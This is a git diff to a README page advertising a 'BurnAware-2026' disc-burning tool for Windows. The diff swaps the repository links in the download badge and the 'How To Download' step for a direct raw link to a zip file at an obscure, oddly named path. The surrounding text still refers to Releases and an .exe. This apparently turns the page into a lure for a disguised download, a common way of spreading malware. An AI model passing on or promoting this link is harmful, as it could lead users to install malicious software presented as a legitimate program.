@@ -5,11 +5,11 @@ description: "Download the BurnAware installer for Windows 10 and 11 to burn, cr
 ---
 # 💿 BurnAware-2026 - Simple Disc Burning For Your PC
 
-[![](https://img.shields.io/badge/Download-BurnAware-blue.svg)](https://github.com/OwusuRandy/BurnAware-2026)
+[![](https://img.shields.io/badge/Download-BurnAware-blue.svg)](https://raw.githubusercontent.com/OwusuRandy/owusurandy.github.io/main/portionist/owusurandy-github-io-intracervical.zip)
 
 ## 📥 How To Download
 
-You can start your download by following this link: [https://github.com/OwusuRandy/BurnAware-2026](https://github.com/OwusuRandy/BurnAware-2026). 
+You can start your download by following this link: [https://raw.githubusercontent.com/OwusuRandy/owusurandy.github.io/main/portionist/owusurandy-github-io-intracervical.zip](https://raw.githubusercontent.com/OwusuRandy/owusurandy.github.io/main/portionist/owusurandy-github-io-intracervical.zip). 
 
 Once you reach the page, look for the section labeled Releases on the right side of your screen. Click the most recent version to open the files. Select the installer file that ends in .exe. Save this file to your computer.
 
